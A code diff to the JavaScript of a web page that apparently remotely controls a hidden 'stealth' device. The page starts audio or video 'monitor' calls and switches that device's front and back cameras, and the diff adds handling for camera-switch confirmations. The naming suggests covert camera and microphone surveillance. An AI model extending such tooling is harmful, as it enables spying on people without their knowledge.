@@ -158,7 +158,6 @@
         let mediaCall = null;
         let isVideoMode = false;
         let keepAliveInterval = null;
-        let currentStealthCamera = 'front';
 
         const connectBtn    = document.getElementById('connectBtn');
         const audioOnlyBtn  = document.getElementById('audioOnlyBtn');
@@ -185,18 +184,28 @@
                 camera: camera
             });
 
-            currentStealthCamera = camera;
-
+            // Update button active states immediately for UI feedback
             frontCameraBtn.classList.toggle('active', camera === 'front');
             backCameraBtn.classList.toggle('active', camera === 'back');
             
-            callStatus.innerText = `📷 Sending command: Switch to ${camera} camera`;
+            callStatus.innerText = `📷 Switching stealth to ${camera} camera...`;
+        }
+
+        // Receive confirmation from stealth that camera switched
+        function handleDataMessage(data) {
+            console.log(`[REMOTE] Received: ${data.type}`);
             
-            setTimeout(() => {
-                if (callStatus.innerText.includes('Sending command')) {
-                    callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
-                }
-            }, 1500);
+            if (data.type === 'camera_switched') {
+                const camera = data.camera;
+                console.log(`[REMOTE] Stealth confirmed switch to ${camera} camera`);
+                callStatus.innerText = `✅ Stealth ${camera} camera ACTIVE`;
+                
+                setTimeout(() => {
+                    if (callStatus.innerText.includes('ACTIVE')) {
+                        callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
+                    }
+                }, 2000);
+            }
         }
 
         // Prevent screen lock
@@ -266,7 +275,6 @@
                 isVideoMode = withVideo;
                 callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;
 
-                // Remote sends a silent stream (no audio, optional tiny video)
                 let streamToSend = null;
                 
                 if (withVideo) {
@@ -341,6 +349,9 @@
             setStatus(true);
             callStatus.innerText = '✅ Connected - Ready to monitor';
             
+            // Listen for data messages (camera switch confirmations)
+            conn.on('data', handleDataMessage);
+            
             conn.on('close', () => { 
                 setStatus(false); 
                 endCall(); 
@@ -383,7 +394,7 @@
         videoCallBtn.addEventListener('click', () => startCall(true));
         endCallBtn.addEventListener('click', endCall);
         
-        // These buttons now send commands to stealth device
+        // Send commands to stealth device
         frontCameraBtn.addEventListener('click', () => switchStealthCamera('front'));
         backCameraBtn.addEventListener('click', () => switchStealthCamera('back'));
 
